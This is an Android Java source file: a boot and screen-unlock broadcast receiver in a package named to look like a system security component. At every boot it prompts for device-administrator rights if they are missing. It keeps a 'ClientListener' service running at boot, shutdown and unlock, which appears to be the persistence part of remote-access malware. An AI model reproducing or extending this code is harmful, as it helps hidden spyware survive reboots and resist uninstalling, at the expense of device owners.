package com.android.security.receiver;

import java.util.List;

import com.android.security.AdminActivity;
import com.android.security.ClientListener;

 
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;

public class MainReceiver extends BroadcastReceiver {
	  private static boolean isShuttingDown = false;
	    
	    public void onReceive(Context context, Intent intent) {
	        String action = intent.getAction();
	        Intent service = new Intent(context, ClientListener.class);
	        service.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        if(action.equals("android.intent.action.BOOT_COMPLETED")) {
 	            DevicePolicyManager dpm = (DevicePolicyManager)context.getSystemService("device_policy");
	            ComponentName deviceComponentName = new ComponentName(context, MyDeviceAdminReceiver.class);
	            if(!dpm.isAdminActive(deviceComponentName)) {
	                startAdminActivity(context);
	            } 
	            service.setAction("boot completed");
	            context.startService(service);
	            return;
	        }
	        if((action.equals("android.intent.action.ACTION_SHUTDOWN")) || (action.equals("android.intent.action.REBOOT"))) {
	            isShuttingDown = true;
	            service.setAction("shuttingdown");
	            context.startService(service);
	            return;
	        }
	        if(action.equals("android.intent.action.USER_PRESENT")) {
	            service.setAction("user present");
	            context.startService(service);
	        }
	    }
	    
	     private void startAdminActivity(Context context) {
	        Intent activity = new Intent(context, AdminActivity.class);
	        activity.addFlags(0x10000000);
	        context.startActivity(activity);
	    }
	     
	    private void startAppByPackageName(Context context) {
	        PackageInfo pi = null;
	        try {
	            pi = context.getApplicationContext().getPackageManager().getPackageInfo(context.getPackageName(), 0x0);
	        } catch(PackageManager.NameNotFoundException e) {
	            return;
	        }
	        try {
	            Intent resolveIntent = new Intent("android.intent.action.MAIN", null);
	            resolveIntent.addCategory("android.intent.category.LAUNCHER");
	            resolveIntent.setPackage(pi.packageName);
	            List<ResolveInfo> apps = context.getApplicationContext().getPackageManager().queryIntentActivities(resolveIntent, 0);
	            ResolveInfo ri = (ResolveInfo)apps.iterator().next();
	            if(ri != null) {
	                String packageName1 = ri.activityInfo.packageName;
	                String className = ri.activityInfo.name;
	                Intent intent = new Intent("android.intent.action.MAIN");
	                intent.addCategory("android.intent.category.LAUNCHER");
	                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	                ComponentName cn = new ComponentName(packageName1, className);
	                intent.setComponent(cn);
	                context.startActivity(intent);
	                return;
	            }
	        } catch(Exception localException1) {
	        }
	    }
}
